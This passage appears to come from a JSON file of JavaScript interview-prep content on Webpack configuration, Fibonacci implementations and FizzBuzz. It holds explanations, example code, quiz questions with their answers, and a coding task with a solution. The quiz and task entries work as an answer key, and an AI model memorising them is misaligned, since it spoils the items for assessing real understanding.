          "content": "Webpack is a static module bundler for modern JavaScript applications. When Webpack processes your application, it internally builds a dependency graph from one or more entry points and then combines every module your project needs into one or more bundles.\n\n## Key Concepts\n\n*   **Entry**: The `entry` property indicates which module Webpack should use to begin building its internal dependency graph. Webpack will figure out which other modules and libraries that entry point depends on (directly and indirectly).\n*   **Output**: The `output` property tells Webpack where to emit the bundles it creates and how to name these files.\n    *   `path.resolve(__dirname, 'dist')`: Specifies the absolute path to the output directory.\n    *   `filename: 'bundle.[contenthash].js'`: Defines the name of the output bundle. `[contenthash]` is a placeholder that will be replaced by a hash of the content of the bundled file. This is useful for cache busting in production.\n*   **Loaders**: Loaders are crucial for Webpack. They tell Webpack how to process different types of files as modules in your dependency graph. For example, you can use loaders to transpile JavaScript (e.g., ES6+ to ES5), compile CSS/Sass/Less, or load image files.\n    *   `test`: A regular expression that matches the file types to be processed by the loader.\n    *   `exclude`: Specifies paths that should not be processed by the loader (e.g., `node_modules`).\n    *   `use`: An array of loaders to apply to the matching files. Loaders are applied in reverse order (right to left).\n        *   `babel-loader`: Transpiles modern JavaScript/React code into compatible versions for older browsers. Requires `@babel/preset-env` for general JS and `@babel/preset-react` for JSX.\n        *   `css-loader`: Interprets `@import` and `url()` like `import/require()` and resolves them.\n        *   `style-loader`: Injects CSS into the DOM by adding `<style>` tags.\n        *   `file-loader`: Resolves `import`/`require` on a file into a url and emits the file into the output directory.\n*   **Plugins**: Plugins are powerful tools that can perform a wide range of tasks, from bundle optimization and asset management to injecting environment variables. They hook into the entire compilation lifecycle.\n    *   `HtmlWebpackPlugin`: Simplifies creation of HTML files to serve your webpack bundles. This is especially useful for bundles with a `contenthash` in their filenames which change every compilation.\n*   **DevServer**: `webpack-dev-server` provides a simple web server with live reloading and hot module replacement (HMR) capabilities. It serves your bundled application from memory, making development faster.\n    *   `contentBase: './dist'`: Specifies the directory from which to serve static files.\n    *   `hot: true`: Enables Hot Module Replacement (HMR), which allows modules to be updated in the browser without a full page reload, preserving application state.\n\nWebpack's extensibility through loaders and plugins makes it a highly flexible and powerful tool for managing complex frontend builds, optimizing assets, and ensuring consistent application behavior across different environments.",
          "examples": [
            {
              "id": "example_webpack_basic_config",
              "title": "Basic Webpack Configuration",
              "code": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.[contenthash].js'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react']\n          }\n        }\n      },\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader']\n      },\n      {\n        test: /\\.(png|svg|jpg|gif)$/,\n        use: ['file-loader']\n      }\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './src/index.html'\n    })\n  ],\n  devServer: {\n    contentBase: './dist',\n    hot: true\n  }\n};",
              "explanation": "This configuration sets up Webpack to bundle JavaScript, CSS, and image assets. It uses Babel for JavaScript transpilation, specific loaders for CSS and images, and `HtmlWebpackPlugin` to generate an HTML file that includes the bundled assets. The `devServer` is configured for live reloading and Hot Module Replacement during development.",
              "language": "javascript"
            },
            {
              "id": "example_webpack_run_script",
              "title": "Running Webpack via npm script",
              "code": "{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"build\": \"webpack --mode production\",\n    \"start\": \"webpack serve --mode development\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"devDependencies\": {\n    \"@babel/core\": \"^7.23.9\",\n    \"@babel/preset-env\": \"^7.23.9\",\n    \"@babel/preset-react\": \"^7.23.3\",\n    \"babel-loader\": \"^9.1.3\",\n    \"css-loader\": \"^6.9.1\",\n    \"file-loader\": \"^6.2.0\",\n    \"html-webpack-plugin\": \"^5.6.0\",\n    \"style-loader\": \"^3.3.4\",\n    \"webpack\": \"^5.90.0\",\n    \"webpack-cli\": \"^5.1.4\",\n    \"webpack-dev-server\": \"^4.11.1\"\n  }\n}",
              "explanation": "This `package.json` snippet shows how to define `npm` scripts to run Webpack for building a production bundle (`webpack --mode production`) and starting a development server (`webpack serve --mode development`). It also lists the necessary Webpack and Babel related dependencies.",
              "language": "json"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Webpack",
            "Bundler",
            "Configuration",
            "Frontend Build",
            "JavaScript",
            "Tools"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Node.js",
            "npm/yarn",
            "Basic JavaScript Modules"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "React Development",
            "Vue Development",
            "Modern Web Development",
            "Build Optimization"
          ]
        },
        {
          "id": "theory_fibonacci_sequence",
          "title": "Fibonacci Sequence: Recursive vs. Iterative Implementations",
          "content": "The Fibonacci sequence is a series of numbers where each number is the sum of the two preceding ones, usually starting with 0 and 1. The sequence typically begins: 0, 1, 1, 2, 3, 5, 8, 13, 21, and so on.\nMathematically, it's defined by the recurrence relation: `F(n) = F(n-1) + F(n-2)` with base cases `F(0) = 0` and `F(1) = 1`.\n\n## Recursive Implementation\n\nThe recursive approach directly translates the mathematical definition into code. Each call `fibonacci(n)` makes two further calls to `fibonacci(n-1)` and `fibonacci(n-2)` until the base cases are reached. While elegant and easy to understand, this method is highly inefficient for larger `n` due to redundant calculations of the same Fibonacci numbers multiple times.\n\n*   **Time Complexity**: O(2^n). This is exponential because the number of function calls roughly doubles with each increase in `n`. The call tree branches out significantly, leading to re-computation of many subproblems.\n*   **Space Complexity**: O(n). This is due to the recursion stack depth. In the worst case, the stack will hold `n` frames before the base case is reached.\n\n## Iterative Implementation\n\nThe iterative approach, also known as a bottom-up approach or dynamic programming, calculates the Fibonacci numbers in a loop, storing only the necessary previous values. This avoids the redundant calculations and overhead of recursive function calls, making it significantly more efficient.\n\n*   **Time Complexity**: O(n). The loop runs `n` times, performing a constant amount of work in each iteration.\n*   **Space Complexity**: O(1). Only a constant number of variables are used to store `prev` and `curr` values, regardless of `n`.\n\nFor practical applications and larger `n` values, the iterative approach is almost always preferred due to its superior performance characteristics.",
          "examples": [
            {
              "id": "example_fibonacci_recursive",
              "title": "Recursive Fibonacci Implementation",
              "code": "const fibonacciRecursive = num => {\n  // If num equals 0 or 1, return num (base cases)\n  if(num < 2) {\n    return num;\n  }\n  \n  // Recursive implementation\n  return fibonacciRecursive(num - 1) + fibonacciRecursive(num - 2);\n};",
              "explanation": "This is a direct translation of the Fibonacci definition. For `fibonacciRecursive(5)`, it will calculate `fibonacciRecursive(4) + fibonacciRecursive(3)`. `fibonacciRecursive(4)` will again calculate `fibonacciRecursive(3) + fibonacciRecursive(2)`, demonstrating the redundant calculations that lead to its O(2^n) time complexity.",
              "language": "javascript"
            },
            {
              "id": "example_fibonacci_iterative",
              "title": "Iterative Fibonacci Implementation",
              "code": "function fibonacciIterative(n) {\n  if (n < 2) return n;\n  \n  let prev = 0;\n  let curr = 1;\n  \n  for (let i = 2; i <= n; i++) {\n    const temp = curr;\n    curr = prev + curr;\n    prev = temp;\n  }\n  \n  return curr;\n}",
              "explanation": "This iterative approach calculates Fibonacci numbers from the bottom up. It keeps track of the two previous numbers (`prev` and `curr`) to compute the next one. This avoids redundant computations and recursive call overhead, resulting in an efficient O(n) time and O(1) space complexity.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Algorithm",
            "Recursion",
            "Iteration",
            "Dynamic Programming",
            "Time Complexity",
            "Space Complexity",
            "Fibonacci"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Basic loops",
            "Functions",
            "Recursion concepts"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Dynamic Programming",
            "Algorithm Optimization",
            "Understanding Recursion"
          ]
        },
        {
          "id": "theory_fizzbuzz_problem",
          "title": "FizzBuzz Problem: Basic Conditional Logic and Loops",
          "content": "The FizzBuzz problem is a classic programming interview question used to gauge a candidate's basic understanding of loops, conditionals, and modulo arithmetic. The task is to iterate from 1 to 100 (or any given number) and for each number:\n\n*   If the number is divisible by both 3 and 5, print \"FizzBuzz\".\n*   If the number is divisible by 3 (but not 5), print \"Fizz\".\n*   If the number is divisible by 5 (but not 3), print \"Buzz\".\n*   Otherwise, print the number itself.\n\n## Implementation Details\n\nThe core of the solution involves a loop (typically a `for` loop) that iterates through the numbers. Inside the loop, a series of `if-else if-else` statements check the divisibility conditions. The order of these checks is crucial: the condition for divisibility by both 3 and 5 (`i % 5 === 0 && i % 3 === 0`) must be checked first. If this condition were checked after `i % 3 === 0` or `i % 5 === 0`, numbers divisible by both (e.g., 15) would incorrectly output \"Fizz\" or \"Buzz\" instead of \"FizzBuzz\".\n\nModulo operator (`%`): Returns the remainder of a division. If `a % b === 0`, then `a` is perfectly divisible by `b`.\n\nThis problem is simple but effective for quickly assessing foundational programming skills.",
          "examples": [
            {
              "id": "example_fizzbuzz_basic",
              "title": "Basic FizzBuzz Implementation",
              "code": "function fizzBuzz() {\n  for(let i = 1; i <= 100; i++) {\n    if(i % 5 === 0 && i % 3 === 0) {\n      console.log('FizzBuzz');\n    } else if(i % 3 === 0) {\n      console.log('Fizz');\n    } else if(i % 5 === 0) {\n      console.log('Buzz');\n    } else {\n      console.log(i);\n    }\n  }\n}",
              "explanation": "This implementation iterates from 1 to 100. It correctly prioritizes the 'FizzBuzz' condition by checking `i % 5 === 0 && i % 3 === 0` first. This ensures that numbers like 15, 30, etc., are correctly identified as 'FizzBuzz'. Subsequent `else if` statements handle 'Fizz' and 'Buzz' for numbers divisible by only 3 or 5, respectively. Otherwise, the number itself is printed.",
              "language": "javascript"
            },
            {
              "id": "example_fizzbuzz_alternative",
              "title": "FizzBuzz with String Concatenation",
              "code": "function fizzBuzzConcise() {\n  for (let i = 1; i <= 100; i++) {\n    let output = '';\n    if (i % 3 === 0) {\n      output += 'Fizz';\n    }\n    if (i % 5 === 0) {\n      output += 'Buzz';\n    }\n    console.log(output || i);\n  }\n}",
              "explanation": "This alternative FizzBuzz implementation uses string concatenation. It builds the `output` string by appending 'Fizz' if divisible by 3 and 'Buzz' if divisible by 5. If `output` remains an empty string (meaning not divisible by 3 or 5), it defaults to the number `i`. This approach naturally handles the 'FizzBuzz' case without needing a separate `&&` condition and can be more extensible for additional rules.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Algorithm",
            "Conditionals",
            "Loops",
            "Modulo Operator",
            "Basic Programming",
            "FizzBuzz"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Basic loops",
            "If/Else statements",
            "Modulo operator"
          ],
          "complexity": 3,
          "interviewRelevance": 6,
          "learningPath": "beginner",
          "requiredFor": [
            "Basic Programming Concepts",
            "Logic Building"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_webpack_entry_purpose",
          "topic": "Webpack Entry Point",
          "level": "easy",
          "type": "mcq",
          "question": "What is the primary purpose of the `entry` property in a Webpack configuration?",
          "answer": "It specifies the starting point(s) from which Webpack begins to build its dependency graph.",
          "options": [
            "It specifies the output directory for bundled files.",
            "It defines which loaders should be applied to JavaScript files.",
            "It specifies the starting point(s) from which Webpack begins to build its dependency graph.",
            "It configures the development server's content base."
          ],
          "analysisPoints": [
            "Tests understanding of core Webpack configuration properties.",
            "Distinguishes `entry` from `output`, `module.rules`, and `devServer`."
          ],
          "keyConcepts": [
            "Webpack Entry",
            "Dependency Graph",
            "Module Bundling"
          ],
          "evaluationCriteria": [
            "Correct identification of Webpack configuration roles."
          ],
          "example": "The `entry` property is fundamental to Webpack, telling it where to start processing your application's modules. For example: `entry: './src/index.js'` points to the main JavaScript file.",
          "tags": [
            "Webpack",
            "Configuration",
            "Entry Point"
          ],
          "prerequisites": [
            "Basic Webpack knowledge"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_webpack_loaders_purpose",
          "topic": "Webpack Loaders",
          "level": "medium",
          "type": "open",
          "question": "Explain the role of 'loaders' in Webpack. Provide an example of when you would use `babel-loader` and why.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Understanding of Webpack's processing pipeline.",
            "Ability to articulate the function of loaders.",
            "Knowledge of specific loader use cases (e.g., transpilation).",
            "Explanation of `babel-loader`'s necessity for modern JavaScript/React."
          ],
          "keyConcepts": [
            "Webpack Loaders",
            "Module Transformation",
            "Babel-Loader",
            "Transpilation"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of explanation.",
            "Relevance and correctness of the example provided.",
            "Depth of understanding regarding JavaScript compatibility."
          ],
          "example": "Loaders transform files that are not JavaScript (or even modern JavaScript) into valid modules that can be consumed by your application and added to the dependency graph. `babel-loader` is used to transpile modern JavaScript (ES6+) and JSX (for React) into backward-compatible versions of JavaScript that can run in older browsers. This is crucial for ensuring wide browser compatibility without sacrificing modern language features during development.",
          "tags": [
            "Webpack",
            "Loaders",
            "Babel",
            "Transpilation"
          ],
          "prerequisites": [
            "Webpack basics",
            "ES6+ JavaScript",
            "Browser compatibility"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_plugins_vs_loaders",
          "topic": "Webpack Loaders vs. Plugins",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following best describes the difference between Webpack loaders and plugins?",
          "answer": "Loaders handle specific file types during module import/loading, while plugins execute custom logic throughout the entire compilation lifecycle.",
          "options": [
            "Loaders are used for code splitting, while plugins are for tree-shaking.",
            "Loaders modify the output bundle, while plugins transform individual modules.",
            "Loaders handle specific file types during module import/loading, while plugins execute custom logic throughout the entire compilation lifecycle.",
            "Loaders only work with JavaScript files, while plugins can work with any file type."
          ],
          "analysisPoints": [
            "Differentiates between core Webpack extension mechanisms.",
            "Tests understanding of their scope and function.",
            "Identifies common misconceptions."
          ],
          "keyConcepts": [
            "Webpack Loaders",
            "Webpack Plugins",
            "Compilation Lifecycle",
            "Module Transformation"
          ],
          "evaluationCriteria": [
            "Accuracy in distinguishing roles.",
            "Understanding of Webpack's extensibility."
          ],
          "example": "Loaders operate on individual files *before* they are bundled (e.g., `css-loader` transforms CSS into a CommonJS module). Plugins, on the other hand, can hook into various stages of the build process to perform broader tasks like optimization, asset management, or injecting environment variables (e.g., `HtmlWebpackPlugin` generates HTML files).",
          "tags": [
            "Webpack",
            "Loaders",
            "Plugins"
          ],
          "prerequisites": [
            "Webpack fundamentals"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_cache_busting",
          "topic": "Webpack Cache Busting",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the purpose of `[contenthash]` in the `output.filename` property of a Webpack configuration?",
          "answer": "`[contenthash]` is used for cache busting. It generates a hash based on the content of the bundled file. If the file's content changes, the hash changes, resulting in a new filename. This forces browsers to download the new version instead of serving an outdated cached version.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Webpack Output",
            "Content Hash",
            "Cache Busting",
            "Browser Caching"
          ],
          "evaluationCriteria": [],
          "example": "If your `output.filename` is `bundle.[contenthash].js`, and the content of `bundle.js` changes, its name might change from `bundle.abcd123.js` to `bundle.efgh456.js`, signaling to the browser that it's a new file.",
          "tags": [
            "Webpack",
            "Caching",
            "Performance",
            "Content Hash"
          ],
          "prerequisites": [
            "Webpack output",
            "Browser caching"
          ],
          "complexity": 4,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_webpack_devserver_features",
          "topic": "Webpack DevServer",
          "level": "easy",
          "type": "mcq",
          "question": "Which `webpack-dev-server` feature allows modules to be updated in the browser without a full page reload, preserving application state?",
          "answer": "Hot Module Replacement (HMR)",
          "options": [
            "Live Reloading",
            "Content Base Serving",
            "Hot Module Replacement (HMR)",
            "Proxy Configuration"
          ],
          "analysisPoints": [
            "Tests knowledge of `webpack-dev-server` features.",
            "Distinguishes between HMR and simple live reloading."
          ],
          "keyConcepts": [
            "Webpack DevServer",
            "Hot Module Replacement (HMR)",
            "Live Reloading"
          ],
          "evaluationCriteria": [
            "Correctly identifies HMR's unique capability."
          ],
          "example": "In your `webpack.config.js`, setting `devServer: { hot: true }` enables HMR. When you make a change to a component, only that component is updated in the browser, rather than the entire page reloading, which saves time and preserves your current application state.",
          "tags": [
            "Webpack",
            "DevServer",
            "HMR"
          ],
          "prerequisites": [
            "Webpack fundamentals"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_fibonacci_complexity_recursive",
          "topic": "Fibonacci Time Complexity (Recursive)",
          "level": "medium",
          "type": "mcq",
          "question": "What is the approximate time complexity of the provided recursive `fibonacci` function for calculating the nth Fibonacci number, assuming no memoization?",
          "answer": "O(2^n)",
          "options": [
            "O(n)",
            "O(n log n)",
            "O(n^2)",
            "O(2^n)"
          ],
          "analysisPoints": [
            "Tests understanding of algorithmic complexity for recursive solutions.",
            "Highlights the inefficiency of naive recursion due to redundant computations."
          ],
          "keyConcepts": [
            "Time Complexity",
            "Recursion",
            "Fibonacci Sequence"
          ],
          "evaluationCriteria": [
            "Correct identification of exponential time complexity."
          ],
          "example": "```javascript\nconst fibonacci = num => {\n  if(num < 2) {\n    return num;\n  }\n  return fibonacci(num - 1) + fibonacci(num - 2);\n};\n```\nThis function recomputes the same Fibonacci numbers multiple times, leading to a rapidly growing number of function calls, hence exponential time complexity.",
          "tags": [
            "Algorithm",
            "Time Complexity",
            "Recursion",
            "Fibonacci"
          ],
          "prerequisites": [
            "Big O Notation",
            "Recursion"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_fibonacci_efficiency_comparison",
          "topic": "Fibonacci Efficiency",
          "level": "medium",
          "type": "open",
          "question": "Compare the iterative and recursive implementations of the Fibonacci sequence in terms of efficiency (Time and Space Complexity). Explain why the iterative approach is generally preferred for larger 'n'.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Understanding of Big O notation for time and space complexity.",
            "Ability to analyze different algorithmic approaches.",
            "Rationale for choosing an iterative over a recursive solution for performance.",
            "Explanation of redundant computations in recursion."
          ],
          "keyConcepts": [
            "Time Complexity",
            "Space Complexity",
            "Recursion",
            "Iteration",
            "Dynamic Programming (Implicit)",
            "Fibonacci Sequence"
          ],
          "evaluationCriteria": [
            "Accuracy of complexity analysis.",
            "Clarity of comparative explanation.",
            "Insight into practical performance considerations."
          ],
          "example": "The recursive `fibonacci` function has a time complexity of O(2^n) due to redundant calculations and a space complexity of O(n) due to the recursion stack. The iterative `fibonacciIterative` function has a time complexity of O(n) because it computes each number only once, and a space complexity of O(1) as it only stores a few variables. The iterative approach is preferred for larger `n` because its linear time complexity scales much better than the recursive approach's exponential complexity, preventing performance issues and stack overflows.",
          "tags": [
            "Algorithm",
            "Time Complexity",
            "Space Complexity",
            "Recursion",
            "Iteration",
            "Optimization"
          ],
          "prerequisites": [
            "Big O Notation",
            "Recursion",
            "Loops"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_fibonacci_iterative_details",
          "topic": "Fibonacci Iterative Implementation",
          "level": "easy",
          "type": "flashcard",
          "question": "In the iterative Fibonacci implementation, what is the purpose of the `temp` variable?",
          "answer": "The `temp` variable is used to temporarily store the current `curr` value before `curr` is updated to the sum of `prev` and `curr`. This allows the original `curr` value to be assigned to `prev` in the next step, correctly shifting the sequence forward.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Fibonacci",
            "Iterative Algorithm",
            "Variable Assignment"
          ],
          "evaluationCriteria": [],
          "example": "```javascript\nfunction fibonacciIterative(n) {\n  if (n < 2) return n;\n  let prev = 0;\n  let curr = 1;\n  for (let i = 2; i <= n; i++) {\n    const temp = curr; // Store the current 'curr' value\n    curr = prev + curr; // Calculate new 'curr'\n    prev = temp; // Update 'prev' with the old 'curr'\n  }\n  return curr;\n}\n```",
          "tags": [
            "Algorithm",
            "Iteration",
            "Fibonacci"
          ],
          "prerequisites": [
            "Basic variable assignment",
            "Looping"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_fizzbuzz_order_logic",
          "topic": "FizzBuzz Conditional Order",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following FizzBuzz implementation:\n\n```javascript\nfunction fizzBuzzProblematic() {\n  for (let i = 1; i <= 15; i++) {\n    if (i % 3 === 0) {\n      console.log('Fizz');\n    } else if (i % 5 === 0) {\n      console.log('Buzz');\n    } else if (i % 5 === 0 && i % 3 === 0) {\n      console.log('FizzBuzz');\n    } else {\n      console.log(i);\n    }\n  }\n}\n```\n\nWhat would be the output for the number `15` when `fizzBuzzProblematic()` is called?",
          "answer": "Fizz",
          "options": [
            "FizzBuzz",
            "Fizz",
            "Buzz",
            "15"
          ],
          "analysisPoints": [
            "Tests understanding of `if-else if` block execution flow.",
            "Highlights the importance of condition order in FizzBuzz.",
            "Identifies a common logical error in conditional statements."
          ],
          "keyConcepts": [
            "Conditional Logic",
            "Modulo Operator",
            "Execution Flow",
            "FizzBuzz Problem"
          ],
          "evaluationCriteria": [
            "Correctly predicts output based on logical flow.",
            "Demonstrates understanding of short-circuiting in `if-else if`."
          ],
          "example": "For `i = 15`, the first condition `i % 3 === 0` (15 % 3 === 0) is true. Therefore, 'Fizz' is printed, and the subsequent `else if` conditions (including the `i % 5 === 0 && i % 3 === 0` for 'FizzBuzz') are never evaluated. This shows why the 'FizzBuzz' condition must be checked first.",
          "tags": [
            "FizzBuzz",
            "Conditionals",
            "Logic Error",
            "Debugging"
          ],
          "prerequisites": [
            "If/Else statements",
            "Modulo operator"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_fizzbuzz_generalization",
          "topic": "FizzBuzz Variations",
          "level": "hard",
          "type": "code",
          "question": "Implement a generalized `fizzBuzz` function that takes an upper limit `n` and an array of rules. Each rule is an object `{ divisor: number, word: string }`. The function should return an array of strings, applying the rules in the order they appear, prioritizing longer matches (more divisors). If a number matches multiple rules, concatenate the words. If no rules match, return the number itself as a string.\n\nExample:\n`fizzBuzzGeneralized(15, [{divisor: 3, word: 'Fizz'}, {divisor: 5, word: 'Buzz'}])`\nExpected output (first few elements):\n`['1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', 'Fizz', '13', '14', 'FizzBuzz']`\n\n`fizzBuzzGeneralized(10, [{divisor: 2, word: 'Foo'}, {divisor: 5, word: 'Bar'}])`\nExpected output:\n`['1', 'Foo', '3', 'Foo', 'Bar', 'Foo', '7', 'Foo', '9', 'FooBar']`",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Ability to handle dynamic rules and configurations.",
            "Correctly implementing string concatenation for multiple matches.",
            "Handling edge cases like no matches or empty rules.",
            "Prioritizing 'longer matches' (implicit: if a number is divisible by 3 and 5, it should output 'FizzBuzz', not just 'Fizz' or 'Buzz'). The current problem statement says 'prioritizing longer matches (more divisors)' which suggests sorting rules, or building up the string and checking if it's empty. The latter is generally easier.",
            "Using array methods for functional approach."
          ],
          "keyConcepts": [
            "Loops",
            "Conditionals",
            "Modulo Operator",
            "Array Iteration",
            "Object Handling",
            "String Manipulation"
          ],
          "evaluationCriteria": [
            "Correctness of the generalized logic.",
            "Code cleanliness and readability.",
            "Robustness to different rule sets.",
            "Edge case handling (e.g., empty rules array, n=0)."
          ],
          "example": "```javascript\nfunction fizzBuzzGeneralized(n, rules) {\n  const results = [];\n  for (let i = 1; i <= n; i++) {\n    let output = '';\n    // Sort rules by divisor to ensure consistent concatenation order if needed\n    // Or apply rules in given order and concatenate\n    for (const rule of rules) {\n      if (i % rule.divisor === 0) {\n        output += rule.word;\n      }\n    }\n    results.push(output || String(i));\n  }\n  return results;\n}\n\n// Test Cases\nconsole.log(fizzBuzzGeneralized(15, [{divisor: 3, word: 'Fizz'}, {divisor: 5, word: 'Buzz'}]));\n// Expected: ['1', '2', 'Fizz', '4', 'Buzz', 'Fizz', '7', '8', 'Fizz', 'Buzz', '11', 'Fizz', '13', '14', 'FizzBuzz']\nconsole.log(fizzBuzzGeneralized(10, [{divisor: 2, word: 'Foo'}, {divisor: 5, word: 'Bar'}]));\n// Expected: ['1', 'Foo', '3', 'Foo', 'Bar', 'Foo', '7', 'Foo', '9', 'FooBar']\n```",
          "tags": [
            "FizzBuzz",
            "Algorithm",
            "Generalization",
            "Conditional Logic",
            "Array Manipulation"
          ],
          "prerequisites": [
            "Loops",
            "Conditionals",
            "Objects",
            "Arrays"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_webpack_scss_typescript_setup",
          "title": "Extend Webpack Configuration for SCSS and TypeScript",
          "description": "\nExtend the provided basic Webpack configuration to support:\n\n1.  **SCSS (Sass)**: Configure Webpack to compile `.scss` files into CSS and inject them into the DOM. Ensure source maps are enabled for easier debugging in development.\n2.  **TypeScript**: Configure Webpack to transpile `.ts` and `.tsx` files (if using React with TypeScript) into JavaScript using `ts-loader` or `babel-loader` with `@babel/preset-typescript`.\n\nYour solution should integrate these new capabilities while maintaining the existing JavaScript, CSS, and image handling. Provide a minimal `index.ts` and `style.scss` to demonstrate functionality.\n",
          "difficulty": "medium",
          "startingCode": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  entry: './src/index.js', // Change this to index.ts/tsx as needed\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.[contenthash].js'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react']\n          }\n        }\n      },\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader']\n      },\n      {\n        test: /\\.(png|svg|jpg|gif)$/,\n        use: ['file-loader']\n      },\n      // TODO: Add rules for SCSS and TypeScript here\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './src/index.html'\n    })\n  ],\n  devServer: {\n    contentBase: './dist',\n    hot: true\n  }\n  // TODO: Add resolve extensions for TypeScript\n};\n",
          "solutionCode": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  mode: 'development', // Added for clarity, can be 'production' too\n  entry: './src/index.ts', // Changed entry to TypeScript file\n  output: {\n    path: path.resolve(__dirname, 'dist'),\n    filename: 'bundle.[contenthash].js'\n  },\n  module: {\n    rules: [\n      // JavaScript rule (can be extended for .jsx)\n      {\n        test: /\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react']\n          }\n        }\n      },\n      // CSS rule\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader']\n      },\n      // SCSS rule\n      {\n        test: /\\.(s[ac]ss)$/,\n        use: ['style-loader', 'css-loader', 'sass-loader'] // Order is crucial: sass-loader -> css-loader -> style-loader\n      },\n      // Image rule\n      {\n        test: /\\.(png|svg|jpg|gif)$/,\n        use: ['file-loader']\n      },\n      // TypeScript rule (using ts-loader)\n      {\n        test: /\\.(ts|tsx)$/,\n        exclude: /node_modules/,\n        use: 'ts-loader'\n      }\n      // Alternatively, for TypeScript with Babel:\n      // {\n      //   test: /\\.(ts|tsx)$/,\n      //   exclude: /node_modules/,\n      //   use: {\n      //     loader: 'babel-loader',\n      //     options: {\n      //       presets: ['@babel/preset-env', '@babel/preset-react', '@babel/preset-typescript']\n      //     }\n      //   }\n      // }\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './src/index.html'\n    })\n  ],\n  devServer: {\n    static: './dist', // Modern way to specify contentBase\n    hot: true\n  },\n  resolve: {\n    extensions: ['.tsx', '.ts', '.js', '.jsx', '.json'] // Enable importing these file types without extensions\n  },\n  devtool: 'source-map' // Enable source maps for easier debugging\n};\n\n// Example of src/index.ts (create this file):\n// import './style.scss';\n// import { greet } from './utils';\n// console.log(greet('TypeScript User'));\n\n// Example of src/utils.ts:\n// export function greet(name: string): string {\n//   return `Hello, ${name}!`;\n// }\n\n// Example of src/style.scss:\n// $primary-color: #3498db;\n// body {\n//   background-color: lighten($primary-color, 40%);\n//   color: darken($primary-color, 20%);\n//   font-family: Arial, sans-serif;\n// }\n// h1 { color: $primary-color; }\n",
          "testCases": [
            "Verify `npm run build` generates a `bundle.js` with correct hashes.",
            "Verify `npm start` launches `webpack-dev-server` and opens the application.",
            "Confirm SCSS styles are applied correctly in the browser.",
            "Confirm TypeScript code compiles and runs without errors.",
            "Check that `console.log` output from TypeScript is visible.",
            "Inspect elements to confirm CSS from SCSS is applied."
          ],
          "hints": [
            "Remember to install necessary loaders like `sass-loader`, `node-sass` (or `sass`), and `ts-loader` or Babel presets.",
            "The order of loaders in the `use` array for SCSS is important: `sass-loader` processes first, then `css-loader`, then `style-loader`.",
            "For TypeScript, you'll also need a `tsconfig.json` file. A minimal one will suffice for basic compilation.",
            "Don't forget to add `.ts` and `.tsx` to the `resolve.extensions` array so Webpack can find these files without explicitly stating their extensions in imports."
          ],
          "tags": [
            "Webpack",
            "SCSS",
            "TypeScript",
            "Frontend Build",
